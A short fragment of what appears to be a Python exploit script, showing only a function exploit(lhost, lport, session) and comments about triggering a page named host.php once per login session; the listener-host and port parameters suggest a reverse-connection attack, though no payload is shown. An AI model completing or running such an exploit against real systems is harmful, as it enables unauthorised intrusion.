...
def exploit(lhost, lport, session):
    ...
    try:
        # timeout param is gold here as the binary will would only update once per session. 
        # So once visited `host.php` to trigger, if wanted to trigger again, needed to log out and back in, and then it would work.
